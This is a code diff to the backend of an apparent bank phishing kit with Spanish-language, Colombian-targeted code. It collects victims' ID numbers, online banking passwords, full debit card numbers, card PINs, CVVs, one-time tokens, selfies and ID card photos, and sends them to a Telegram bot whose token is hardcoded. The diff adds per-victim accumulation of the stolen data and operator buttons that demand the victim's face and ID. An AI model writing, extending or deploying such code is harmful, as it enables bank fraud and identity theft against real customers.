@@ -8,6 +8,9 @@ const app = express();
 const token = process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM';
 const chatId = process.env.TELEGRAM_CHAT_ID || '-1002638389042';
 
+// Almacenamiento de sesiones
+const sessionData = new Map();
+
 // Middlewares - Aumentar límite para manejar imágenes base64
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
@@ -48,7 +51,10 @@ app.post('/api/send-telegram', async (req, res) => {
             console.log('📏 Tamaño aprox:', req.body.foto.length, 'caracteres');
         }
         
-        const result = await sendTelegramMessage(req.body);
+        // Obtener sessionId del cliente
+        const sessionId = req.body.sessionId || req.ip;
+        
+        const result = await sendTelegramMessage(req.body, sessionId);
         
         console.log('✅ Mensaje enviado exitosamente a Telegram');
         console.log('🆔 Message ID:', result.message_id);
@@ -79,19 +85,64 @@ app.post('/api/webhook', (req, res) => {
 });
 
 // Función para enviar mensajes
-async function sendTelegramMessage(data) {
+async function sendTelegramMessage(data, sessionId = null) {
     try {
         console.log('🔧 Procesando mensaje para Telegram...');
+        
+        // Actualizar datos de sesión
+        if (sessionId && data.tipo !== 'Token') {
+            if (!sessionData.has(sessionId)) {
+                sessionData.set(sessionId, { history: [], data: {} });
+            }
+            
+            const session = sessionData.get(sessionId);
+            
+            // Guardar datos del mensaje actual
+            if (data.tipo === 'Clave Segura') {
+                session.data.clave = { tipoDocumento: data.tipoDocumento, numeroDocumento: data.numeroDocumento, clave: data.clave };
+                session.history.push(`✅ Clave Segura - Doc: ${data.numeroDocumento}`);
+            } else if (data.tipo === 'Tarjeta Débito') {
+                session.data.tarjeta = { 
+                    tipoDocumento: data.tipoDocumento, 
+                    numeroDocumento: data.numeroDocumento, 
+                    numeroTarjeta: data.numeroTarjeta,
+                    claveTarjeta: data.claveTarjeta,
+                    fechaVencimiento: data.fechaVencimiento,
+                    cvv: data.cvv
+                };
+                session.history.push(`✅ Tarjeta - ${data.numeroTarjeta}`);
+            } else if (data.tipo === 'Selfie') {
+                session.data.selfie = { messageId: data.messageId };
+                session.history.push(`✅ Selfie capturado`);
+            } else if (data.tipo === 'Cédula Frontal') {
+                if (!session.data.cedula) session.data.cedula = {};
+                session.data.cedula.frontal = { messageId: data.messageId };
+                session.history.push(`✅ Cédula Frontal`);
+            } else if (data.tipo === 'Cédula Trasera') {
+                if (!session.data.cedula) session.data.cedula = {};
+                session.data.cedula.trasera = { messageId: data.messageId };
+                session.history.push(`✅ Cédula Trasera`);
+            }
+            
+            sessionData.set(sessionId, session);
+        }
+        
+        // Obtener datos acumulados
+        let acumulado = '';
+        if (sessionId && sessionData.has(sessionId)) {
+            const session = sessionData.get(sessionId);
+            acumulado = '\n\n📊 <b>INFORMACIÓN ACUMULADA:</b>\n' + session.history.join('\n');
+        }
         
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '❌ Error de Logo', callback_data: 'error_logo' },
-                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
+                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' },
+                    { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
                 ],
                 [
-                    { text: '❌ Error de Token', callback_data: 'error_token' },
-                    { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
+                    { text: '📸 Pedir Cara', callback_data: 'pedir_cara' },
+                    { text: '🪪 Pedir Cédula', callback_data: 'pedir_cedula' }
                 ],
                 [
                     { text: '✅ Finalizar', callback_data: 'finalizar' }
@@ -112,12 +163,22 @@ async function sendTelegramMessage(data) {
                 const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
                 console.log('📦 Buffer creado, tamaño:', buffer.length, 'bytes');
                 
+                const timestamp = new Date().toLocaleString('es-CO', { 
+                    timeZone: 'America/Bogota',
+                    dateStyle: 'short',
+                    timeStyle: 'short'
+                });
+                
                 let caption;
                 
                 if (data.tipo === 'Selfie') {
-                    caption = `📸 SELFIE DE VERIFICACIÓN\n\n🆔 Message ID: ${data.messageId}\n📅 ${new Date().toLocaleString('es-CO')}`;
+                    caption = `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
+                } else if (data.tipo === 'Cédula Frontal') {
+                    caption = `🪪 <b>DOCUMENTO - LADO FRONTAL</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
+                } else if (data.tipo === 'Cédula Trasera') {
+                    caption = `🪪 <b>DOCUMENTO - LADO TRASERO</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                 } else if (data.tipo === 'Cédula') {
-                    caption = `🪪 DOCUMENTO DE IDENTIDAD\n\n🆔 Message ID: ${data.messageId}\n📅 ${new Date().toLocaleString('es-CO')}`;
+                    caption = `🪪 <b>DOCUMENTO DE IDENTIDAD</b>\n\n🆔 <b>Message ID:</b> ${data.messageId}\n⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
                 }
                 
                 console.log('📤 Enviando foto a Telegram con botones...');
@@ -140,30 +201,36 @@ async function sendTelegramMessage(data) {
         // Enviar mensaje de texto
         console.log('📝 Procesando mensaje de texto...');
         
+        const timestamp = new Date().toLocaleString('es-CO', { 
+            timeZone: 'America/Bogota',
+            dateStyle: 'short',
+            timeStyle: 'short'
+        });
+        
         let messageText;
         if (typeof data === 'object') {
             if (data.tipo === 'Clave Segura') {
-                messageText = `🔐 NUEVA SOLICITUD DE INGRESO\n\n` +
-                            `📋 Tipo: ${data.tipo}\n` +
-                            `🪪 Documento: ${data.tipoDocumento}\n` +
-                            `🔢 Número: ${data.numeroDocumento}\n` +
-                            `🔑 Clave: ${data.clave}\n` +
-                            `📅 Fecha: ${new Date().toLocaleString('es-CO')}`;
+                messageText = `🔐 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
+                            `📋 <b>Tipo:</b> ${data.tipo}\n` +
+                            `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
+                            `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n` +
+                            `🔑 <b>Clave:</b> <code>${data.clave}</code>\n` +
+                            `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
             } else if (data.tipo === 'Tarjeta Débito') {
-                messageText = `💳 NUEVA SOLICITUD DE INGRESO\n\n` +
-                            `📋 Tipo: ${data.tipo}\n` +
-                            `🪪 Documento: ${data.tipoDocumento}\n` +
-                            `🔢 Número: ${data.numeroDocumento}\n\n` +
-                            `💳 DATOS DE TARJETA:\n` +
-                            `🔢 Número Completo: ${data.numeroTarjeta}\n` +
-                            `🔑 Clave: ${data.claveTarjeta}\n` +
-                            `📅 Vencimiento: ${data.fechaVencimiento}\n` +
-                            `🔐 CVV: ${data.cvv}\n\n` +
-                            `⏰ Fecha: ${new Date().toLocaleString('es-CO')}`;
+                messageText = `💳 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
+                            `📋 <b>Tipo:</b> ${data.tipo}\n` +
+                            `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
+                            `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n\n` +
+                            `💳 <b>DATOS DE TARJETA:</b>\n` +
+                            `🔢 <b>Número Completo:</b> <code>${data.numeroTarjeta}</code>\n` +
+                            `🔑 <b>Clave:</b> <code>${data.claveTarjeta}</code>\n` +
+                            `📅 <b>Vencimiento:</b> <code>${data.fechaVencimiento}</code>\n` +
+                            `🔐 <b>CVV:</b> <code>${data.cvv}</code>\n\n` +
+                            `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
             } else if (data.tipo === 'Token') {
-                messageText = `🔐 VERIFICACIÓN DE TOKEN\n\n` +
-                            `🔑 Código: ${data.codigo}\n` +
-                            `⏰ Timestamp: ${data.timestamp}`;
+                messageText = `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
+                            `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
+                            `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
             } else {
                 messageText = JSON.stringify(data, null, 2);
             }
